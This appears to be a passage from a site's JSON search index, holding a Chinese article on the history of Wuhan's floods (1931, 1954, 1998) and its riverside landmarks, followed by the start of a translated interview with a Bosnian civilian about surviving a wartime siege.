\u300a\u6b66\u6c49\u5730\u65b9\u5fd7\u300b\u5bf9\u6b66\u6c49\u5927\u6c34\u7684\u8bb0\u8f7d\u975e\u5e38\u4e30\u5bcc\uff0c\u660e\u6d2a\u6b66\u4e8c\u5341\u4e09\u5e74\uff081390\u5e74\uff098\u6708\uff0c\u201c\u972a\u96e8\uff0c\u5e90\u820d\u4eba\u755c\u6df9\u6ca1\u65e0\u6570\u201d\uff0c\u662f\u7b2c\u4e00\u6761\u8bb0\u8f7d\uff0c\u6b64\u540e\u51e0\u4e4e\u6bcf\u4e09\u5e74\u5c31\u6709\u4e00\u573a\u5927\u6c34\u62dc\u8bbf\u6b66\u6c49\uff0c\u6216\u662f\u201c\u8fde\u65e5\u9634\u96e8\uff0c\u5e90\u820d\u4eba\u755c\u6df9\u6ca1\u65e0\u6570\u201d\uff0c\u6216\u662f\u201c\u66b4\u96e8\u7ec8\u65e5\uff0c\u6c34\u6ea2\uff0c\u6df9\u7530\u5343\u9877\uff0c\u6df9\u6b7b\u4eba\u755c\u3002\u7b2c\u4e8c\u5e74\uff0c\u53c8\u5927\u6c34\u3002\u201d \u5728\u5176\u8bb0\u8f7d\u4e2d\uff0c\u6709\u51e0\u5e74\u7684\u8bb0\u8f7d\u7279\u522b\u8be6\u7ec6\uff0c\u8fd9\u51e0\u5e74\u4e5f\u6070\u5de7\u662f\u5927\u6c34\u7279\u522b\u4e25\u91cd\u7684\u65f6\u671f\uff0c\u5982\u6c11\u56fd\u4e8c\u5341\u5e74\uff081931\u5e74\uff096\u6708\uff0c\u201c\u9ec4\u9ebb\u5927\u96e8\uff0c\u5c71\u6d2a\u66b4\u53d1\uff0c\u6c34\u6f2b\u5824\u584c\uff0c\u7530\u5730\u6df9\u6ca1\uff0c\u6cdb\u6ee5\u6210\u707e\uff0c\u6c5f\u6c34\u731b\u6da8\uff0c\u957f\u6c5f\u6c34\u4f4d\u8fbe27.86\u7c73\uff0c\u7530\u5730\u6df9\u6ca1\u51b2\u538b\uff0c\u6c11\u623f\u5012\u584c\u3002\u201d\u8fd9\u573a\u6d2a\u6c34\u6b66\u6c49\u4e09\u9547\u5747\u88ab\u6df9\u6ca1\uff0c\u635f\u5931\u60e8\u91cd\uff0c\u800c\u7531\u4e8e\u653f\u5e9c\u7684\u6551\u63f4\u4e0d\u53ca\u65f6\uff0c\u6df9\u6b7b\u75c5\u6b7b\u4eba\u53e3\u4f17\u591a\u3002 1954\u5e74\u590f\u5929\u4e5f\u662f\u6b66\u6c49\u5e02\u6c11\u8bb0\u5fc6\u6df1\u523b\u7684\u4e00\u5e74\uff0c\u90a3\u5e745~7\u6708\uff0c\u4e09\u4e2a\u6708\u96c6\u4e2d\u964d\u96e81634.7\u6beb\u7c73\uff0c7\u6708\u4e2d\u65ec\uff0c\u5012\u6c34\u5c71\u6d2a\u66b4\u6da8\uff0c\u6c34\u4f4d\u9ad8\u8fbe30.17\u7c73\u3002\u90a3\u662f20\u4e16\u7eaa\u957f\u6c5f\u6700\u5927\u7684\u6d2a\u6c34\uff0c\u4eac\u6c49\u94c1\u8def\u4e2d\u65ad\u4e86100\u591a\u5929\uff0c\u8346\u6c5f\u4e09\u6b21\u5206\u6d2a\uff0c\u4f46\u662f\u6b66\u6c49\u4fdd\u4f4f\u4e86\uff0c\u4e3a\u7eaa\u5ff5\u6b64\u6b21\u6297\u6d2a\uff0c\u5728\u6c5f\u5824\u4e0a\u7acb\u8d77\u4e86\u9632\u6c5b\u7eaa\u5ff5\u7891\u3002 1998\u5e74\uff0c\u8fde\u7eed\u4e09\u4e2a\u6708\u7684\u96e8\u9020\u6210\u6d2a\u6c34\u4e00\u6cfb\u5343\u91cc\uff0c\u51e0\u4e4e\u5168\u6d41\u57df\u6cdb\u6ee5\uff0c\u8fd9\u662f1954\u5e74\u4ee5\u6765\u957f\u6c5f\u9762\u4e34\u7684\u6700\u5927\u6d2a\u6c34\u3002 \u800c\u9762\u5bf9\u5e38\u5e74\u7684\u6d2a\u6c34\uff0c\u6b66\u6c49\u5e02\u6c11\u5df2\u7ecf\u5c06\u5176\u5f53\u6210\u751f\u6d3b\u4e2d\u4e60\u4ee5\u4e3a\u5e38\u7684\u4e8b\u4e86\uff0c\u4e5f\u6709\u4e86\u4e00\u5957\u9762\u5bf9\u6d2a\u6c34\u7684\u65b9\u5f0f\u3002\u5c0f\u65f6\u5019\u5728\u5b66\u6821\u91cc\u8001\u5e08\u8bf4\u6d2a\u6c34\u6765\u4e86\uff0c\u7537\u5b69\u5b50\u8981\u628a\u5973\u5b69\u5b50\u7528\u76c6\u5b50\u5212\u51fa\u53bb\uff1b\u957f\u5927\u4e86\uff0c\u957f\u8f88\u544a\u8bc9\u6211\u4eec\uff0c\u8981\u65ad\u5b9a\u6c5f\u6c34\u7684\u6da8\u843d\uff0c\u53bb\u6c5f\u8fb9\u6570\u53f0\u9636\u5c31\u53ef\u4ee5\u4e86\uff0c\u6bd4\u4e13\u4e1a\u9884\u62a5\u8fd8\u76f4\u89c2\uff1b\u6614\u65e5\u7684\u5824\u9632\u6210\u4e86\u6c5f\u6ee9\u4f11\u95f2\u5e7f\u573a\uff0c\u590f\u65e5\u7684\u508d\u665a\uff0c\u8df3\u8df3\u821e\u8c08\u8c08\u60c5\uff1b\u9f99\u738b\u5e99\u7684\u9669\u6bb5\u4e5f\u6709\u4e86\u4eb2\u6c34\u5e73\u53f0\uff0c\u5929\u9ad8\u4e91\u6de1\u65f6\uff0c\u5750\u5cb8\u8fb9\u770b\u4e24\u6c5f\u4ea4\u6c47\u6e05\u6d4a\u5206\u660e\u3002 \u201c6\u6708\uff0c\u6c49\u53e3\u8fde\u7eed\u4e0b\u4e863\u4e2a\u661f\u671f\u7684\u5927\u96e8\uff0c\u4eba\u4eec\u88ab\u8feb\u7a7f\u8d77\u4e86\u76ae\u8863\uff0c\u57ce\u91cc\u7684\u6d2a\u6c34\u5230\u5904\u90fd\u670912\u82f1\u5c3a\u6df1\uff0c\u9664\u4e86\u5c4b\u9876\uff0c\u5f88\u5c11\u8fd8\u6709\u4ec0\u4e48\u9732\u5728\u6c34\u9762\u4e0a\u3002\u201d\u8fd9\u662f\u4e00\u540d\u9a7b\u6c49\u53e3\u82f1\u56fd\u9886\u4e8b\u57281849\u5e74\u7684\u7b14\u8bb0\u3002\u7f8e\u56fd\u4e13\u5bb6\u7f57\u5a01\u5ec9\u7814\u7a76\u4e86\u8fd9\u4e9b\u7b14\u8bb0\u548c\u8d44\u6599\uff0c\u5728\u4ed6\u7684\u4e13\u8457\u300a\u6c49\u53e3\uff1a\u4e00\u4e2a\u4e2d\u56fd\u57ce\u5e02\u7684\u51b2\u7a81\u548c\u793e\u533a\u300b\u4e2d\u5199\u9053\uff1a\u201c\u5b9e\u9645\u4e0a\uff0c\u6d2a\u6c34\u4fb5\u88ad\u5df2\u7ecf\u6210\u4e3a\u6c49\u53e3\u751f\u6d3b\u4e2d\u4e00\u4ef6\u4e60\u4ee5\u4e3a\u5e38\u7684\u4e8b\u4e86\uff0c\u5927\u4f17\u7684\u53cd\u5e94\u5df2\u7ecf\u5f62\u6210\u4e86\u6a21\u5f0f\uff1a\u5835\u585e\u6c34\u53e3\uff0c\u6cbf\u5927\u5824\u5b89\u7f6e\u597d\u6c34\u8f66\uff0c\u51c6\u5907\u597d\u758f\u6563\u7528\u7684\u9ad8\u5730\uff0c\u5f53\u5730\u7684\u5584\u4eba\u4f1a\u5728\u57ce\u5e02\u7684\u901a\u8862\u4e0a\u67b6\u8bbe\u4e34\u65f6\u6865\u6881\uff0c\u8f83\u7a77\u7684\u4eba\u9a7e\u7740\u5c0f\u8239\u53bb\u6446\u6e21\u5e02\u6c11\u3002\u91cd\u8981\u7684\u662f\uff0c\u5168\u57ce\u7684\u4eba\u90fd\u5728\u4e3a\u65b0\u7684\u4e00\u5e74\u91cc\u6062\u590d\u57ce\u5e02\u800c\u51fa\u94b1\u51fa\u529b\u3002\u201d \u5b9e\u9645\u4e0a\uff0c\u6d2a\u6c34\u4fb5\u88ad\u5df2\u7ecf\u6210\u4e3a\u6c49\u53e3\u751f\u6d3b\u4e2d\u4e00\u4ef6\u4e60\u4ee5\u4e3a\u5e38\u7684\u4e8b\u4e86\uff0c\u5927\u4f17\u7684\u53cd\u5e94\u5df2\u7ecf\u5f62\u6210\u4e86\u6a21\u5f0f\uff1a\u5835\u585e\u6c34\u53e3\uff0c\u6cbf\u5927\u5824\u5b89\u7f6e\u597d\u6c34\u8f66\uff0c\u51c6\u5907\u597d\u758f\u6563\u7528\u7684\u9ad8\u5730\uff0c\u5f53\u5730\u7684\u5584\u4eba\u4f1a\u5728\u57ce\u5e02\u7684\u901a\u8862\u4e0a\u67b6\u8bbe\u4e34\u65f6\u6865\u6881\uff0c\u8f83\u7a77\u7684\u4eba\u9a7e\u7740\u5c0f\u8239\u53bb\u6446\u6e21\u5e02\u6c11\u3002\u91cd\u8981\u7684\u662f\uff0c\u5168\u57ce\u7684\u4eba\u90fd\u5728\u4e3a\u65b0\u7684\u4e00\u5e74\u91cc\u6062\u590d\u57ce\u5e02\u800c\u51fa\u94b1\u51fa\u529b\u3002 \u9632\u6c5b\u9669\u70b9\u53d8\u6210\u6c11\u4f17\u4e50\u56ed \u201c\u9ec4\u56db\u5a18\u5bb6\u82b1\u6ee1\u8e4a\uff0c\u5343\u6735\u4e07\u6735\u538b\u679d\u4f4e\u3002\u7559\u8fde\u620f\u8776\u65f6\u65f6\u821e\uff0c\u81ea\u5728\u5a07\u83ba\u6070\u6070\u557c\u3002\u201d\u675c\u752b\u7684\u300a\u6c5f\u7554\u72ec\u6b65\u5bfb\u82b1\u300b\u7528\u6765\u63cf\u5199\u521d\u590f\u6c5f\u6ee9\u7684\u666f\u8272\u6700\u597d\u4e0d\u8fc7\u4e86\uff0c\u6b64\u65f6\u6c5f\u6ee9\u5df2\u892a\u53bb\u4e86\u6625\u5929\u7684\u7ea2\u82b1\uff0c\u653e\u773c\u671b\u53bb\u90fd\u662f\u6d53\u7eff\u3002 \u6b66\u6c49\u5386\u6765\u53d7\u6c34\u60a3\u4e0d\u65ad\uff0c\u5728\u8fd1\u767e\u5e74\u7684\u5386\u53f2\u4e0a\u5c31\u7ecf\u5386\u4e86\u4e09\u6b21\u8d85\u5927\u6d2a\u6c34\u7684\u4fb5\u88ad\uff0c\u5206\u522b\u662f1931\u5e74\u30011954\u5e74\u548c1998\u5e74\uff0c\u800c\u6b66\u6c49\u51e0\u4e4e\u5e74\u5e74\u90fd\u8981\u63a5\u53d7\u6c5b\u671f\u7684\u8003\u9a8c\u30021931\u5e74\u5165\u590f\u540e\uff0c\u5168\u56fd\u5883\u5185\u7531\u5357\u5230\u5317\uff0c\u6deb\u96e8\u6570\u6708\u4e0d\u5f00\uff0c\u5bfc\u81f4\u6c34\u7978\u904d\u53ca\u6c5f\u3001\u6dee\u3001\u9ec4\u4e09\u5927\u6d41\u57df\u3002\u5730\u5904\u957f\u6c5f\u4e2d\u6e38\u7684\u6b66\u6c49\u66f4\u662f\u9669\u8c61\u73af\u751f\uff0c\u56e0\u6cb3\u6c34\u66b4\u6da8\uff0c7\u670829\u65e5\uff0c\u6c5f\u6c49\u5173\u6c34\u4f4d\u5347\u81f326.94\u7c73\uff0c\u4e39\u6c34\u6c60\u9996\u5148\u7834\u5824\u30028\u67082\u65e5\u51cc\u6668\uff0c\u5355\u6d1e\u95e8\u94c1\u8def\u51b3\u5824\uff0c\u5927\u6c34\u76f4\u5954\u5e02\u533a\uff0c\u6c49\u53e3\u5168\u5883\u6d78\u6ca1\u6c34\u4e2d\u3002\u968f\u540e\u6b66\u660c\u3001\u6c49\u9633\u7684\u5824\u575d\u88ab\u51b2\u6bc1\uff0c\u6b66\u6c49\u4e09\u9547\u5728\u82e6\u96e8\u6691\u70ed\u4e2d\u6d78\u6ce1\u8fbe\u4e24\u6708\u4e4b\u4e45\uff0c\u6ca7\u6d77\u6851\u7530\uff0c\u8fd9\u573a\u5927\u6d2a\u6c34\u7559\u4e0b\u7684\u9057\u5740\uff0c\u5728\u6b66\u6c49\u5e02\u5185\u5df2\u5f88\u96be\u627e\u5bfb\u3002 \u5982\u4eca\uff0c\u5728\u6c5f\u6ee9\u89c1\u5230\u7684\u201c\u6b66\u6c49\u9632\u6c5b\u7eaa\u5ff5\u7891\u201d\u5efa\u4e8e1969\u5e74\uff0c\u4e3a\u4e86\u7eaa\u5ff51954\u5e74\u6b66\u6c49\u4eba\u6c11\u6218\u80dc\u6d2a\u6c34\u800c\u4fee\u5efa\u3002\u636e\u300a\u4e2d\u56fd\u6c34\u6587\u5fd7\u300b\u8bb0\u8f7d\uff1a1954\u5e74\uff0c\u957f\u6c5f\u6d41\u57df\u5e72\u6d41\u5404\u4e3b\u8981\u7ad9\u8d85\u8fc7\u8b66\u6212\u6c34\u4f4d\u8fbe60~135\u5929\uff0c\u4ece7\u6708\u4e0b\u65ec\u8d77\uff0c\u8346\u6c5f\u5927\u5824\u8fdb\u5165\u6297\u6d2a\u7d27\u5f20\u9636\u6bb5\u3002\u6b66\u6c49\u51738\u670818\u65e5\u6700\u9ad8\u6c34\u4f4d\u8fbe29.73\u7c73\uff0c\u8d8529\u7c73\u9ad8\u6c34\u4f4d\u8fd0\u884c23\u5929\uff0c\u8d8528.28\u7c73\u6c34\u4f4d\u8fd0\u884c52\u5929\uff0c\u8d8526.30\u7c73\u8b66\u6212\u6c34\u4f4d\u8fd0\u884c\u6574100\u5929\u3002\u6b66\u6c49\u5e02\u51fa\u52a830\u4e07\u4eba\u529b\uff0c\u98ce\u96e8\u517c\u7a0b\uff0c\u65e5\u4ee5\u7ee7\u591c\uff0c\u624d\u53d6\u5f97\u4e86\u6297\u6d2a\u6597\u4e89\u7684\u91cd\u5927\u80dc\u5229\u3002\u6bdb\u6cfd\u4e1c\u4e3a\u6b66\u6c49\u6218\u80dc\u6d2a\u6c34\u4eb2\u81ea\u9898\u8bcd\uff0c\u540e\u88ab\u64b0\u5199\u5728\u201c\u6b66\u6c49\u9632\u6c5b\u7eaa\u5ff5\u7891\u201d\u4e0a\uff0c\u6210\u4e3a\u6b66\u6c49\u4eba\u6c11\u4e0e\u6d2a\u6c34\u6597\u4e89\u7684\u6807\u5fd7\u6027\u7eaa\u5ff5\u5efa\u7b51\uff0c\u4e5f\u6210\u4e3a\u6b66\u6c49\u4e0e\u6d2a\u6c34\u6597\u4e89\u7684\u7cbe\u795e\u8c61\u5f81\u3002 \u4ece\u201c\u6b66\u6c49\u9632\u6c5b\u7eaa\u5ff5\u7891\u201d\u51fa\u53d1\uff0c\u6cbf\u957f\u6c5f\u5cb8\u8fb9\u9006\u7740\u6c34\u6d41\u7684\u65b9\u5411\u524d\u884c\u7ea63\u516c\u91cc\u5c31\u5230\u4e86\u9f99\u738b\u5e99\u3002\u6309\u7167\u8001\u6b66\u6c49\u4eba\u7684\u8bf4\u6cd5\uff0c\u9f99\u738b\u5e99\u6240\u5728\u7684\u5730\u65b9\u624d\u53eb\u505a\u6b63\u5b97\u7684\u6c49\u53e3\uff0c\u56e0\u4e3a\u6c49\u6c5f\u8fdb\u5165\u957f\u6c5f\u7684\u5173\u53e3\u5c31\u5728\u8fd9\u91cc\uff0c\u6c49\u53e3\u7684\u540d\u5b57\u4e5f\u662f\u7531\u6b64\u800c\u6765\u3002\u6c49\u6c5f\u4e0e\u957f\u6c5f\u5728\u9f99\u738b\u5e99\u8fd9\u4e2a\u5730\u65b9\uff0c\u5f62\u6210\u4e00\u4e2a\u201c\u4eba\u201d\u5b57\uff0c\u957f\u6c5f\u6c34\u4e0e\u6c49\u6c5f\u95f4\u4f1a\u5f62\u6210\u4e00\u80a1\u62c9\u529b\uff0c\u4e0d\u65ad\u51b2\u5237\u6c5f\u5cb8\uff0c\u8fd9\u662f\u6b66\u6c49\u6700\u9669\u8981\u7684\u5730\u6bb5\u3002\u4ece\u56db\u5b98\u6bbf\u5230\u96c6\u5bb6\u5634\uff0c\u5730\u4e0b\u6c34\u8d28\u590d\u6742\uff0c\u6c34\u6d41\u76f8\u4e92\u9876\u6258\uff0c\u5728\u8fc7\u53bb\u6c89\u8239\u6e83\u5824\u4e8b\u4ef6\u7ecf\u5e38\u53d1\u751f\uff0c\u8fd91080\u7c73\u53ef\u4ee5\u79f0\u4e3a\u9f99\u738b\u5e99\u9669\u6bb5\u3002\u57281998\u5e74\u6d2a\u6c34\u4e4b\u524d\uff0c\u6bcf\u5e74\u90fd\u8981\u5728\u6b64\u6bb5\u629b\u77f3\u56fa\u5824\uff0c\u4ee5\u514d\u6025\u6d41\u628a\u6c34\u4e0b\u7684\u5824\u811a\u638f\u7a7a\u3002 \u5982\u4eca\uff0c\u7ecf\u8fc7\u5927\u89c4\u6a21\u5824\u9632\u5efa\u8bbe\uff0c\u6614\u65e5\u7684\u9669\u6bb5\u5df2\u6210\u4e3a\u6c11\u4f17\u6e38\u73a9\u7684\u4e50\u56ed\uff0c\u6c5f\u6c34\u540e\u7f29\uff0c\u5cb8\u8fb9\u7684\u7ec6\u6c99\u6ce5\u4e0a\u957f\u6ee1\u4e86\u82a6\u82c7\uff0c\u6c5f\u8fb9\u6e38\u73a9\u95f2\u5750\u7684\u4eba\u5f00\u59cb\u5f80\u6811\u836b\u4e0b\u805a\u96c6\uff0c\u62ac\u5934\u671b\u53bb\uff0c\u67f3\u6811\u9876\u4e0a\u84dd\u5929\u4e0b\uff0c\u98de\u7740\u6591\u6593\u7684\u98ce\u7b5d\u3002\u5230\u4e86\u591c\u95f4\uff0c\u51c9\u98ce\u5439\u8fc7\u7684\u5e7f\u573a\uff0c\u66f4\u662f\u6c11\u4f17\u7eb3\u51c9\u4f11\u95f2\u7684\u597d\u53bb\u5904\u3002 \u5ef6\u4f38\u9605\u8bfb \u5d14\u98a2\u770b\u5230\u7684\u9e66\u9e49\u6d32 \u5eb7\u7199\u672b\u5e74\u5df2\u6c89\u5165\u6c5f\u5e95 \u6b66\u6c49\u7684\u6c5f\u5fc3\u6d32\u4e2d\u6700\u6709\u540d\u7684\u5f53\u5c5e\u9e66\u9e49\u6d32\uff0c\u5510\u4ee3\u5927\u8bd7\u4eba\u5d14\u98a2\u7684\u8bd7\u53e5\u201c\u6674\u5ddd\u5386\u5386\u6c49\u9633\u6811\uff0c\u82b3\u8349\u840b\u840b\u9e66\u9e49\u6d32\u201d\u8ba9\u9e66\u9e49\u6d32\u95fb\u540d\u5929\u4e0b\u3002\u4f46\u662f\uff0c\u4eca\u5929\u7684\u9e66\u9e49\u6d32\u5df2\u7ecf\u4e0d\u590d\u8bd7\u4e2d\u7684\u573a\u666f\uff0c\u5b83\u751a\u81f3\u5df2\u7ecf\u4e0d\u518d\u662f\u4e00\u4e2a\u6c5f\u5fc3\u6d32\u4e86\uff0c\u540d\u53eb\u9e66\u9e49\u6d32\u7684\u6240\u5728\u5730\u4eca\u5929\u662f\u7e41\u534e\u7684\u5c45\u6c11\u533a\u548c\u8857\u9053\uff0c\u6211\u4eec\u53ea\u80fd\u5728\u4f9d\u7136\u5c1a\u5b58\u7684\u201c\u9e66\u9e49\u8def\u201d\u7b49\u5730\u540d\u4e2d\u611f\u53d7\u5230\u5176\u5b58\u5728\u3002 \u7531\u4e8e\u4e24\u5cb8\u7684\u5824\u9632\u9650\u5236\uff0c\u4ee5\u53ca\u9f9f\u86c7\u5c71\u7684\u5ca9\u77f3\u5730\u8d28\u6240\u5f62\u6210\u7684\u201c\u8282\u70b9\u201d\u4f5c\u7528\uff0c\u957f\u6c5f\u6b66\u6c49\u6bb5\u7684\u6cb3\u9053\u53d8\u5316\u4e0d\u5927\uff0c\u4f46\u662f\uff0c\u7531\u4e8e\u6c34\u6d41\u548c\u6de4\u6c99\u7684\u539f\u56e0\uff0c\u6c5f\u5fc3\u6d32\u7684\u53d8\u5316\u6bd4\u8f83\u660e\u663e\uff0c\u6709\u7684\u6d88\u5931\uff0c\u6709\u7684\u9760\u5cb8\uff0c\u6709\u7684\u65b0\u5d1b\u8d77\uff0c\u4e0d\u4e00\u800c\u8db3\u3002 \u201c\u9e66\u9e49\u6d32\u201d\u6b63\u662f\u4e00\u4e2a\u7ecf\u5386\u4e86\u6d88\u5931\u53c8\u518d\u6b21\u5d1b\u8d77\u7684\u6c5f\u5fc3\u6d32\u3002\u6839\u636e\u300a\u6c34\u7ecf\u6ce8\u300b\u8bb0\u8f7d\uff0c\u5d14\u98a2\u8bd7\u4e2d\u7684\u53e4\u9e66\u9e49\u6d32\u5927\u7ea6\u662f\u4f4d\u4e8e\u4eca\u86c7\u5c71\u4ee5\u5357\u3001\u9c87\u9c7c\u53e3\u4ee5\u5317\uff0c\u7531\u5357\u81f3\u5317\uff0c\u6d32\u957f\u7ea6\u56db\u516c\u91cc\u3002\u76f8\u4f20\u7531\u4e1c\u6c49\u672b\u5e74\u7962\u8861\u5728\u9ec4\u7956\u7684\u957f\u5b50\u9ec4\u5c04\u5927\u4f1a\u5bbe\u5ba2\u65f6\uff0c\u5373\u5e2d\u6325\u7b14\u5199\u5c31\u4e00\u7bc7\u201c\u9535\u9535\u621b\u91d1\u7389\uff0c\u53e5\u53e5\u6b32\u98de\u9e23\u201d\u7684\u300a\u9e66\u9e49\u8d4b\u300b\u800c\u5f97\u540d\u3002 \u53e4\u9e66\u9e49\u6d32\u5728\u5510\u5b8b\u5143\u65f6\u671f\u662f\u5546\u4e1a\u96c6\u5e02\u7e41\u8363\u4e4b\u5730\uff0c\u201c\u6d32\u524d\u4e07\u6237\u4eba\u5bb6\u201d\u3001\u201c\u5217\u8086\u5982\u6809\u201d\u3002\u660e\u671d\u672b\u5e74\uff0c\u957f\u6c5f\u4e2d\u6e38\u7ecf\u5386\u4e86\u4e00\u4e2a\u5927\u6d2a\u6c34\u671f\uff0c\u6c34\u91cf\u7684\u589e\u5927\u52a0\u5feb\u4e86\u72ed\u7a84\u6cb3\u6bb5\u6c34\u6d41\u7684\u901f\u5ea6\uff0c\u4f7f\u5f97\u9e66\u9e49\u6d32\u4e0d\u65ad\u4e0b\u6c89\uff0c\u5230\u6e05\u5eb7\u7199\u672b\u5e74\u96cd\u6b63\u521d\u5e74\u5b8c\u5168\u6c89\u6ca1\u4e8e\u6c5f\u5e95\u3002 \u6e05\u671d\u4e7e\u9686\u5e74\u95f4\uff0c\u6c49\u9633\u5357\u7eaa\u95e8\u5916\u6c5f\u8fb9\u53c8\u6de4\u51fa\u4e00\u4e2a\u65b0\u6c99\u6d32\u2014\u2014\u8fd9\u5c31\u662f\u6211\u4eec\u73b0\u5728\u770b\u5230\u7684\u6c49\u9633\u9e66\u9e49\u6d32\u3002\u8fd9\u4e2a\u65b0\u7684\u9e66\u9e49\u6d32\u670910\u4f59\u91cc\u957f\u7684\u5cb8\u7ebf\uff0c\u6c34\u6df1\u9002\u5b9c\uff0c\u6ee9\u5730\u5bbd\u9614\uff0c\u81f3\u5609\u5e86\u5e74\u95f4\u9010\u6e10\u6210\u4e3a\u6e56\u5357\u3001\u6e56\u5317\u5546\u4eba\u7684\u7af9\u6728\u96c6\u6563\u5730\u3002\u540e\u6765\u7531\u4e8e\u957f\u6c5f\u6c34\u6d41\u6ce5\u6c99\u7684\u7efc\u5408\u4f5c\u7528\uff0c\u9e66\u9e49\u6d32\u9010\u6e10\u9760\u5cb8\uff0c\u6210\u4e3a\u4eca\u5929\u770b\u5230\u7684\u5c45\u6c11\u805a\u5c45\u533a\u3002 \u6587\u7ae0\u4f5c\u8005\uff1a\u8c22\u65b9 \u539f\u6587\u5730\u5740\uff1a\u3000 http://slt.hubei.gov.cn/slyw/slwh/slls/201912/t20191213_1761914.shtml","title":"\u6b66\u6c49\uff1a\u767e\u5e74\u7684\u6d2a\u6c34\u8bb0\u5fc6"},{"location":"other/%E6%B3%A2%E9%BB%91%E5%9B%B4%E5%9F%8E%E6%88%98%E4%B8%AD%E7%9A%84%E5%B9%B8%E5%AD%98%E8%80%85/","text":"\u6ce2\u9ed1\u56f4\u57ce\u6218\u4e2d\u7684\u5e78\u5b58\u8005 1992\uff5e96\u5e74\u7684\u6ce2\u9ed1\u6218\u4e89\uff0c\u5bf9\u4e8e\u5f88\u591a\u56fd\u4eba\u800c\u8a00\uff0c\u662f\u4e00\u573a\u964c\u751f\u7684\u6218\u4e89\u3002\u524d\u5357\u5404\u65cf\u6b66\u88c5\u5272\u636e\u4e00\u65b9\uff0c\u4e3a\u4e86\u4e89\u593a\u5730\u76d8\uff08\u5c24\u5176\u662f\u585e\u65cf\uff09\u9488\u5bf9\u6ce2\u9ed1\u5e73\u6c11\u5236\u9020\u8fc7\u5f88\u591a\u9a87\u4eba\u542c\u95fb\u7684\u56f4\u56f0\uff0c\u5c60\u57ce\uff0c\u5f3a\u66b4\u548c\u52ab\u63a0\u7b49\u6076\u884c\uff0c\u4f7f\u5f97\u666e\u901a\u4eba\u9677\u5165\u6700\u6076\u52a3\u7684\u751f\u5b58\u707e\u96be\u3002\u585e\u65cf\u519b\u961f\u66fe\u5305\u56f4\u6ce2\u9ed1\u9996\u90fd\u8428\u62c9\u70ed\u7a9d\u957f\u8fbe\u4e09\u5e74\uff0c\u5207\u65ad\u7269\u8d44\u4f9b\u5e94\uff0c\u5e76\u65e5\u591c\u70ae\u51fb\u57ce\u533a\uff0c\u6570\u4e07\u5e02\u6c11\u5728\u72d9\u51fb\u624b\u3001\u75be\u75c5\u548c\u51bb\u997f\u4e2d\u6b7b\u4ea1\u3002 \u672c\u6587\u6765\u81eaSHTFplan.com\u7f51\u7ad9\uff0c\u662f\u4e00\u4e2a\u6ce2\u9ed1\u5e73\u6c11Selco\u7684\u8bbf\u8c08\u5f55\uff0c\u4ed6\u5c45\u4f4f\u5728\u6ce2\u9ed1\u5357\u90e8\u7684\u67d0\u4e2a\u5c0f\u57ce\u5e02\uff0c\u540c\u6837\u7ecf\u5386\u4e861\u5e74\u5de6\u53f3\u7684\u4e71\u519b\u56f4\u57ce\u3002\u8bbf\u8c08\u56f4\u7ed5Selco\u4e00\u5bb615\u53e3\u4eba\u5982\u4f55\u5728\u8fd9\u573a\u4eba\u7978\u4e2d\u751f\u5b58\u7684\u7ecf\u8fc7\uff0c\u5bf9\u6b64\u7c7b\u6001\u52bf\u4e0b\u7684\u751f\u5b58\u95ee\u9898\u8fdb\u884c\u4e86\u63a2\u8ba8\u3002 \u8bbf\u8c08\u7684\u5185\u5bb9\uff0c\u8bd1\u8005\u91cd\u65b0\u6309\u4e3b\u9898\u8fdb\u884c\u4e86\u6574\u7406\uff0c\u5408\u5e76\u4e86\u8bb8\u591a\u91cd\u590d\u7684\u8bdd\u9898\u548c\u5185\u5bb9\uff0c\u4ee5\u4fbf\u53c2\u9605\u3002 \u57fa\u672c\u60c5\u51b5 Selco\u8bb2\uff0c\u6218\u4e89\u7206\u53d1\u540e\uff0c\u98df\u7269\uff0c\u6c34\uff0c\u71c3\u6599\uff0c\u7535\u529b\uff0c\u901a\u4fe1\u90fd\u4e2d\u65ad\u4e86\uff0c\u5e02\u653f\u548c\u6cbb\u5b89\u762b\u75ea\uff0c\u533b\u9662\u7684\u533b\u751f\u5927\u90e8\u5206\u9003\u4ea1\uff0c\u836f\u54c1\u548c\u533b\u7597\u5668\u68b0\u7f3a\u4e4f\u4f9b\u5e94\u3002 \u5f88\u591a\u5e02\u6c11\u7f3a\u4e4f\u51c6\u5907\uff0c\u4e09\u4e2a\u6708\u5934\u4e0a\u5c31\u5f00\u59cb\u6709\u4eba\u997f\u6b7b\u3001\u51bb\u6b7b\u6216\u75c5\u6b7b\uff08\u6218\u4e89\u521d\u671f\u5373\u8fdb\u5165\u51ac\u5b63\uff09\u3002 Selco\u7684\u5bb6\u4eba\u4e2d\u67092\u4eba\u56e0\u4e3a\u559d\u810f\u6c34\u96e8\u6c34\u75c5\u6b7b\u3002\u4e00\u70b9\u70b9\u5c0f\u7684\u75be\u75c5\u5c31\u80fd\u8981\u547d\u3002 \u867d\u7136\u7f8e\u56fd\u4eba\u6bcf\u9694\u5341\u51e0\u5929\u7a7a\u6295\u4e00\u6b21\u98df\u54c1\uff0c\u4f46\u663e\u7136\u8fdc\u8fdc\u65e0\u6cd5\u6ee1\u8db3\u9700\u6c42\u3002\u5e02\u6c11\u4e2d\u5c11\u6570\u7684\u4e00\u4e9b\u5bb6\u5ead\u4f1a\u79cd\u83dc\uff0c\u6709\u65f6\u5019\u5076\u5c14\u80fd\u6293\u5230\u9e3d\u5b50\u548c\u5154\u5b50\u3002\u5728\u4e61\u4e0b\u60c5\u51b5\u5219\u597d\u5f88\u591a\u3002 \u6c7d\u6cb9\u6bd4\u9ec4\u91d1\u8fd8\u8d35\uff0c\u6c7d\u8f66\u51e0\u4e4e\u65e0\u7528\u3002\u8d27\u5e01\u8d2c\u503c\u98de\u5feb\uff0c\u94b1\u4ec0\u4e48\u4e5f\u4e70\u4e0d\u5230\uff0c\u7269\u7269\u4ea4\u6613\u91cd\u73b0\u3002\u4eba\u4eec\u7684\u751f\u6d3b\u56de\u5230\u4e86\u77f3\u5668\u65f6\u4ee3\uff0c\u8bb8\u591a\u4eba\u62c6\u623f\u5c4b\u7684\u95e8\u7a97\u3001\u5bb6\u5177\u505a\u67f4\u706b\uff0c\u516c\u56ed\u7684\u6811\u6728\u5f88\u5feb\u5c31\u70e7\u5b8c\u4e86\uff0c\u968f\u540e\u90a3\u91cc\u53c8\u6210\u4e86\u5893\u5730\uff0c\u7528\u6765\u8349\u8349\u57cb\u846c\u6b7b\u53bb\u7684\u4eba\u4eec\u3002\u6218\u540e\u4eba\u4eec\u91cd\u65b0\u8fc1\u575f\uff0c\u90a3\u662f\u540e\u8bdd\u4e86\u3002 